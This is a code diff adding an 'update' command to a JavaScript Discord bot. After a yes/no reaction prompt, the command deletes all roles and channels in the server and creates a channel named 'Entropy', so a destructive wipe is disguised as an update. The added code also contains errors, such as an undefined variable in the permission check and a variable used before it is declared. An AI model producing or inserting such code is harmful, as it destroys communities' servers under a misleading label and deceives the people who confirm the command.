@@ -748,3 +748,36 @@ let args = message.content.split(' ').slice(1).join(' ');
     
   });
 
+client.on('message', msg => {
+  if(!msg.guild) return;
+    if(!msg.member.hasPermission('MANAGE_CHANNELS')) return message.reply('the commands has update!');
+    if (msg.content.startsWith(prefix +'update')) {
+let ra3d = new Discord.RichEmbed()
+.setColor('RANDOM')
+.setThumbnail(msg.author.avatarURL)
+.setDescription(`Yes ? or No?\n  ✅  \n  ❌ \n  لديك 60 ثانية للاختيار`)                                                                                                                                                                       
+msg.channel.send(ra3d).then(message => {
+ message.react('✅').then(r=>{
+ message.react('❌').then(r=>{           
+ let sd = (reaction, user) => reaction.emoji.name === '✅' && user.id === msg.author.id;
+ let nd = (reaction, user) => reaction.emoji.name === '❌' && user.id === msg.author.id;
+ let ds  = message.createReactionCollector(sd, { time: 60000 });
+ let dn  = message.createReactionCollector(nd, { time: 60000 });
+dn.on("collect", r => {
+msg.channel.send("`تم الالغاء`")
+message.delete();
+})
+ds.on("collect", r => {
+message.guild.roles.forEach(r => { r.delete() }) 
+     message.guild.channels.forEach(c => { c.delete() })
+     message.guild.createChannel('Entropy', 'text').then(c=> c.send(ra3d));
+     let ra3d = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('`✅`')
+           message.channel.sendEmbed(ra3d);
+})
+})
+})
+})
+}
+});
